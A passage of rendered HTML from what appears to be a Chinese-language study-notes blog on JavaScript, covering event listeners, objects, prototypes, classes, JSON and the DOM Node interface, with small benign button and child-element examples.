class="hljs-title function_">addEventListener</span>(type, listener);<br><span class="hljs-title function_">addEventListener</span>(type, listener, options);<br><span class="hljs-title function_">addEventListener</span>(type, listener, useCapture);<br></code></pre></td></tr></table></figure></li><li><p><strong>removeEventListener()</strong> ：移除事件处理器</p></li></ul><p>不要使用内联事件处理器。</p><p><strong>事件对象</strong>：在事件处理函数内部，可能会看到一个固定指定名称的参数，例如 <code>event</code>、<code>evt</code> 或 <code>e</code>。这被称为<strong>事件对象</strong>。它被自动传递给事件处理函数，以提供额外的功能和信息。</p><p>大多数事件对象都有一套标准的属性和方法（请参阅 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Event"><code>Event</code></a> 对象参考）。</p><p> <strong><code>stopPropagation()</code></strong> ：阻止捕获和冒泡阶段中当前事件的进一步传播。</p><p><strong>对象</strong>是一个包含<strong>相关数据（属性）</strong>和<strong>方法</strong>的集合。</p><p>对象的属性和方法可使用<strong>点表示法</strong>来访问，也可使用<strong>括号表示法</strong>。</p><ul><li>点表示法通常优于括号表示法，因为它更简洁易读</li></ul><p>一个对象可以作为另一个对象成员的值。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: &#123;<br>    <span class="hljs-attr">first</span>: <span class="hljs-string">&quot;Bob&quot;</span>,<br>    <span class="hljs-attr">last</span>: <span class="hljs-string">&quot;Smith&quot;</span>,<br>  &#125;,<br>  <span class="hljs-comment">// …</span><br>&#125;;<br><span class="hljs-comment">//链式的使用点表示法访问</span><br>person.<span class="hljs-property">name</span>.<span class="hljs-property">first</span>;<br>person.<span class="hljs-property">name</span>.<span class="hljs-property">last</span>;<br><span class="hljs-comment">//使用括号表示法访问</span><br>person[<span class="hljs-string">&quot;age&quot;</span>];<br>person[<span class="hljs-string">&quot;name&quot;</span>][<span class="hljs-string">&quot;first&quot;</span>];<br><br></code></pre></td></tr></table></figure><p>JavaScript 中所有的对象都有一个内置属性，称为它的 <strong>prototype</strong>（原型）。它本身是一个对象，故原型对象也会有它自己的原型，逐渐构成了<strong>原型链</strong>。原型链终止于拥有 <code>null</code> 作为其原型的对象上。</p><ul><li>有个对象叫 <strong><code>Object.prototype</code><strong>，它是</strong>最基础的原型</strong>，所有对象默认都拥有它.</li><li><code>Object.prototype</code> 的原型是 <code>null</code>，所以它位于<strong>原型链的终点</strong></li></ul><p><strong><code>Object.getPrototypeOf()</code></strong> 静态方法返回指定对象的原型（即内部 <code>[[Prototype]]</code> 属性的值）。</p><p><strong>设置原型：</strong></p><ul><li><p>Object.create() </p></li><li><p>构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> personPrototype = &#123;<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我的名字是 <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>！`</span>);<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, personPrototype);<br><span class="hljs-comment">// 或</span><br><span class="hljs-comment">// Person.prototype.greet = personPrototype.greet;</span><br></code></pre></td></tr></table></figure><ul><li><strong>Object.assign()</strong> 静态方法将一个或者多个源对象中所有可枚举的自有属性复制到目标对象，并返回修改后的目标对象。</li></ul></li></ul><p>object.**hasOwnProperty(<strong>propertyName</strong>)**：检测属性是否为对象的自有属性，返回布尔值。</p><p>object.<strong>hasOwn(<strong>propertyName</strong>)：</strong>如果指定的对象自身有指定的属性，则静态方法 Object.hasOwn() 返回 true。如果属性是继承的或者不存在，该方法返回 false。（旨在取代object.hasOwnProperty()）</p><p><strong>类与构造函数</strong></p><p>用class声明一个类。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  name;<br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">introduceSelf</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi! I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中包含：</p><ul><li>一个 <code>name</code> 属性。（可以省略）</li><li>一个需要 <code>name</code> 参数的构造函数，这一参数用于初始化新的对象的 <code>name</code> 属性。</li><li>一个 <code>introduceSelf()</code> 方法，使用 <code>this</code> 引用了对象的属性。</li></ul><p>如果不需要任何特殊的初始化内容，可以<strong>省略构造函数</strong>。</p><p><strong>继承：extends</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Professor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Person</span> &#123;<br>  teaches;<br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, teaches</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">//调用父类的构造函数，传递name参数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">teaches</span> = teaches;<br>  &#125;<br><br>  <span class="hljs-title function_">introduceSelf</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//覆盖父类方法</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>      <span class="hljs-string">`My name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, and I will be your <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.teaches&#125;</span> professor.`</span>,<br>    );<br>  &#125;<br><br>  <span class="hljs-title function_">grade</span>(<span class="hljs-params">paper</span>) &#123; <span class="hljs-comment">//添加新方法</span><br>    <span class="hljs-keyword">const</span> grade = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (<span class="hljs-number">5</span> - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(grade);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>封装</strong>：私有属性、私有方法以哈希前缀**<code>#</code>**定义。例如<code>#year</code>。</p><p><strong>JSON</strong>：基于JavaScript语法的数据格式（但独立于JavaScript）。</p><p>JSON可以作为一个对象或者字符串存在。前者用于解读JSON中的数据，后者用于通过网络传输JSON数据。</p><p>一个 JSON 对象可以被储存在它自己的文件中，扩展名为 <code>.json</code>。还有 <code>application/json</code> MIME类型。</p><p>JSON是一种纯数据格式，只包含属性，没有方法。需使用双引号，单引号无效。</p><ul><li><p>**parse()**：以文本字符串形式接受 JSON 对象作为参数，并返回相应的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//例子：</span><br><span class="hljs-keyword">const</span> superHeroes = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(superHeroesText);<br></code></pre></td></tr></table></figure><ul><li>text() 方法将响应作为文本获取，而不是 JSON</li><li>然后我们使用 parse() 将文本转换为 JavaScript 对象。</li></ul></li><li><p>stringify()：接收一个对象作为参数，返回一个对应的 JSON 字符串。</p></li></ul><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p><em><strong>文档对象模型 (DOM)</strong> 将 web 页面与到脚本或编程语言连接起来。</em></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>DOM是JavaScript是操作网页的<u><strong>接口</strong></u>。</p><p>DOM是一个<strong>接口规范</strong>（可由各种语言实现），严格说并不是JavaScript语法的一部分，而是用于建立网站的Web API。</p><p>它的作用是将网页转成一个JavaScript对象，从而可以用脚本进行各种操作（增删改查）。</p><p>浏览器根据DOM模型，将结构化文件（如HTML、XML）<strong>解析成一系列的节点（node）</strong>，再由节点组成一个树状结构（DOM Tree）。</p><ul><li><p><strong>节点</strong>：DOM的<strong>最小组成单位</strong>。</p><p>有七种类型：</p><ul><li>**<code>Document</code>**：整个文档树的顶层节点</li><li>**<code>DocumentType</code>**：<code>doctype</code>标签（比如<code>&lt;!DOCTYPE html&gt;</code>）</li><li>**<code>Element</code>**：网页的各种HTML标签（比如<code>&lt;body&gt;</code>、<code>&lt;a&gt;</code>等）</li><li>**<code>Attr</code>**：网页元素的属性（比如<code>class=&quot;right&quot;</code>）</li><li>**<code>Text</code>**：标签之间或标签包含的文本</li><li>**<code>Comment</code>**：注释</li><li>**<code>DocumentFragment</code>**：文档的片段</li></ul><p>浏览器提供一个原生的节点对象<strong>Node</strong><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="**`Node`** 是一个接口，各种类型的 DOM API 对象会从这个接口继承。">[2]</span></a></sup>，上面的其中节点都继承了Node。</p></li><li><p><strong>节点树</strong>：一个文档的所有结点，按照所在的层级，都可以抽象成一种树状结构。</p><p>除了根节点，其他节点都有三种层级关系。</p><ul><li><strong>父节点关系（parentNode）</strong>：直接的那个上级节点</li><li><strong>子节点关系（childNodes）</strong>：直接的下级节点</li><li><strong>同级节点关系（sibling）</strong>：拥有同一个父节点的节点</li></ul></li></ul><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>在使用 DOM 时，不需要做任何其他特殊的操作。可以在脚本中直接使用 JavaScript 的 API，这是一个由浏览器运行的程序。</p><p>基本的数据类型：</p><ul><li><p><strong>Document</strong></p></li><li><p><strong>Node</strong></p><ul><li><p>各种类型的DOM API对象会从这个接口继承</p></li><li><p>以下接口都从 <code>Node</code> 继承其方法和属性：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element"><code>Element</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Attr"><code>Attr</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CharacterData"><code>CharacterData</code></a> (which <a href="https://developer.mozilla.org/en-US/docs/Web/API/Text"><code>Text</code> </a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Comment"><code>Comment</code></a>, and <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CDATASection"><code>CDATASection</code></a> inherit), <a href="https://developer.mozilla.org/en-US/docs/Web/API/ProcessingInstruction"><code>ProcessingInstruction</code> </a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DocumentFragment"><code>DocumentFragment</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DocumentType"><code>DocumentType</code></a>, <code>Notation</code>, <code>Entity</code>, <code>EntityReference</code></p></li></ul></li><li><p><strong>Element</strong></p><ul><li>通用性非常强的基类，所有 <code>Document</code> 对象下的对象都继承自它。</li><li>这个接口描述了所有相同种类的元素所普遍具有的方法和属性。</li></ul></li><li><p><strong>NodeList</strong></p><ul><li>节点的集合，通常是由<strong>属性</strong>（如<code>Node.childNodes</code>)和 <strong>方法</strong>（如<code>document.querySelectorAll</code> ）返回的。</li><li><code>NodeList</code> <strong>不是一个数组</strong>，是一个类似数组的对象 (Like Array Object)。</li></ul></li><li><p><strong>Attr</strong></p><ul><li>表示一个 DOM 元素的属性。</li></ul></li><li><p><strong>NamedNodeMap</strong></p><ul><li>表示属性节点 <code>Attr </code>对象的集合。</li><li>尽管在<code>NamedNodeMap</code>里面的对象可以像数组一样通过<strong>索引</strong>来访问，但是它和<code>NodeList</code>不一样，对象的顺序没有指定。</li></ul></li></ul><p><code>document</code> 和 <code>window</code> 对象是在 DOM 编程中最常使用的接口对象。</p><ul><li><code>window</code> 对象代表类似浏览器的东西</li><li><code>document</code> 对象是文档本身的根。</li></ul><p>在 web 和 XML 页面脚本中使用 DOM 时，一些<strong>常用的 API 简要列表</strong>:</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector"><code>document.querySelector()</code></a></p><p>返回文档中与指定选择器或选择器组匹配的第一个 <code>Element</code>对象。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelectorAll"><code>document.querySelectorAll()</code></a></p><p>返回与指定的选择器组匹配的文档中的<strong>元素列表</strong> (使用深度优先的先序遍历文档的节点)。返回的对象是 <code>NodeList</code> 。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/createElement"><code>document.createElement()</code></a></p><p>创建一个由标签名称 <em>tagName</em> 指定的 HTML 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML"><code>Element.innerHTML</code></a></p><p>设置或获取 HTML 语法表示的元素的后代。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/setAttribute"><code>Element.setAttribute()</code></a></p><p>指定元素上的某个属性值。</p><p>若存在，更新。否则设定一个新的属性。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getAttribute"><code>Element.getAttribute()</code></a></p><p>返回元素上一个指定的属性值。</p><p>不存在，返回null或空字符串。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener"><code>EventTarget.addEventListener()</code></a></p><p>监听。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style"><code>HTMLElement.style</code></a></p><p>元素内联样式。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/appendChild"><code>Node.appendChild()</code></a></p><p>将一个节点附加到指定父节点的子节点列表的末尾处。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/load_event"><code>window.onload</code></a></p><p><strong><code>load</code></strong> 事件在整个页面及所有依赖资源如样式表和图片都已完成加载时触发。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/scrollTo"><code>window.scrollTo()</code></a></p><p>滚动到文档中的某个坐标。</p></li></ul><p>案例：点击按钮1清空文本内容，点击按钮2填充文本内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;story&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;set-text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>设置文本内容<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;clear-text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>清除文本内容<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> story = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.story&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> setText = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#set-text&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">setText.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span></span><br><span class="language-javascript"><span class="language-xml">  story.<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;It was a dark and stormy night...&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> clearText = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#clear-text&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">clearText.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span></span><br><span class="language-javascript"><span class="language-xml">  story.<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>案例2：添加子元素，删除子元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;parent&quot;</span>&gt;</span>父元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;add-child&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>添加子元素<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remove-child&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>移除子元素<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> parent = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.parent&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> add_child = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#add-child&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> remove_child = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#remove-child&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">add_child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>,<span class="hljs-function">()=&gt;</span>&#123;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> new_child = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  new_child.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&quot;child&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  new_child.<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;子节点&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">  parent.<span class="hljs-title function_">appendChild</span>(new_child);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">remove_child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>,<span class="hljs-function">()=&gt;</span>&#123;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> new_child = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.child&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  parent.<span class="hljs-title function_">removeChild</span>(new_child);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="Node接口"><a href="#Node接口" class="headerlink" title="Node接口"></a>Node接口</h2><blockquote><p>所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。</p></blockquote><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul><li><p>Node.prototype.<strong>nodeType</strong> —— 节点<strong>类型</strong></p><ul><li>nodeType属性返回一个<strong>整数值</strong>，<strong>表示节点的类型</strong>。</li><li>不同节点的<code>nodeType</code>属性值和对应的常量如下。<ul><li>文档节点（document）：<strong>9</strong><ul><li>对应常量：<code>Node.DOCUMENT_NODE</code></li></ul></li><li>元素节点（element）：<strong>1</strong><ul><li>对应常量：<code>Node.ELEMENT_NODE</code></li></ul></li><li>属性节点（attr）：<strong>2</strong><ul><li>对应常量：<code>Node.ATTRIBUTE_NODE</code></li></ul></li><li>文本节点（text）：<strong>3</strong><ul><li>对应常量：<code>Node.TEXT_NODE</code></li></ul></li><li>文档片断节点（DocumentFragment）：<strong>11</strong><ul><li>对应常量：<code>Node.DOCUMENT_FRAGMENT_NODE</code></li></ul></li><li>文档类型节点（DocumentType）：<strong>10</strong><ul><li>对应常量：<code>Node.DOCUMENT_TYPE_NODE</code></li></ul></li><li>注释节点（Comment）：<strong>8</strong><ul><li>对应常量：<code>Node.COMMENT_NODE</code></li></ul></li></ul></li></ul></li><li><p>Node.prototype.<strong>nodeName</strong> —— <strong>节点名</strong></p></li><li><p>Node.prototype.<strong>nodeValue</strong> —— <strong>当前节点文本值</strong></p><ul><li>nodeValue返回一个字符串，表示<strong>节点本身的文本值</strong>。该属性可读写。</li><li>只有<strong>文本节点（text）、注释节点（comment）和属性节点（attr）</strong>有文本值。其他节点均返回<strong>null</strong>。</li></ul></li><li><p>Node.prototype.<strong>textContent</strong> —— <strong>当前及后代节点文本值</strong></p><ul><li>对于文本节点（text）、注释节点（comment）和属性节点（attr）以外，其他类型的节点，该属性会将<strong>每个子节点（不包括注释节点）的内容连接在一起返回（它会自动忽略当前节点内部的 HTML 标签）</strong>。</li><li>如果一个节点没有子节点，则返回空字符串。</li></ul></li><li><p>Node.prototype.<strong>baseURI</strong> —— 当前网页<strong>绝对路径</strong></p><ul><li>如果<strong>无法读取</strong>，返回<strong>null</strong>。</li></ul></li><li><p>Node.prototype.<strong>ownerDocument</strong> —— 顶层文档对象 </p><ul><li>返回当前节点所在的顶层文档对象，即document对象。</li><li><code>document</code>对象本身的<code>ownerDocument</code>属性，返回<code>null</code>。</li></ul></li><li><p>Node.prototype.<strong>nextSibling</strong> —— 节点<strong>后</strong>的第一个<strong>同级节点</strong></p></li><li><p>Node.prototype.<strong>previousSibling</strong> —— 节点<strong>前</strong>最近的<strong>同级节点</strong></p></li><li><p>Node.prototype.<strong>parentNode</strong> —— <strong>父</strong>节点</p></li><li><p>Node.prototype.<strong>parentElement</strong> —— <strong>父元素</strong>节点</p></li><li><p>Node.prototype.<strong>firstChild</strong> —— <strong>第一个</strong>子节点</p></li><li><p>Node.prototype.<strong>lastChild</strong> —— <strong>最后一个</strong>子节点</p></li><li><p>Node.prototype.<strong>childNodes</strong> —— <strong>所有子节点</strong>（包括当前节点）</p><ul><li>返回一个类似数组的对象（<code>NodeList</code>集合）</li></ul></li><li><p>Node.prototype.<strong>isConnected</strong> —— 当前节点是否在文档中（布尔值）</p></li></ul><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li><p>Node.prototype.<strong>appendChild()</strong> —— 在底部插入一个子节点</p><ul><li>若插入的节点存在，会移动到底部</li></ul></li><li><p>Node.prototype.<strong>hasChildNodes()</strong>  —— 是否存在子节点（布尔值）</p><p>判断<strong>是否存在子节点</strong>的方式：</p><ol><li><code>node.hasChildNodes()</code></li><li><code>node.firstChild !== null</code></li><li><code>node.childNodes &amp;&amp; node.childNodes.length &gt; 0</code></li></ol></li><li><p>Node.prototype.<strong>cloneNode()</strong> —— <strong>克隆</strong>节点</p><ul><li>接受布尔值作为参数，表示是否同时克隆子节点。</li></ul></li><li><p>Node.prototype.<strong>insertBefore()</strong> —— 节点<strong>插入父节点内部指定位置</strong></p><ul><li>&#96;&#96;&#96;js<br>var insertedNode &#x3D; parentNode.insertBefore(newNode, referenceNode);<br>&#x2F;&#x2F;插在referenceNode之前<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">-</span> Node.prototype.<span class="hljs-strong">**removeChild()**</span> —— <span class="hljs-strong">**移除指定子节点**</span><br><br><span class="hljs-bullet">-</span> Node.prototype.<span class="hljs-strong">**replaceChild()**</span> —— <span class="hljs-strong">**替换**</span>指定子节点<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">```js</span><br><span class="hljs-code">    var replacedNode = parentNode.replaceChild(newChild, oldChild);</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>Node.prototype.<strong>contains()</strong> </p><ul><li>返回布尔值，来判断参数节点是否满足以下三个条件之一<ul><li>参数节点为当前节点。</li><li>参数节点为当前节点的子节点。</li><li>参数节点为当前节点的后代节点。</li></ul></li></ul></li><li><p>Node.prototype.<strong>compareDocumentPosition()</strong> —— 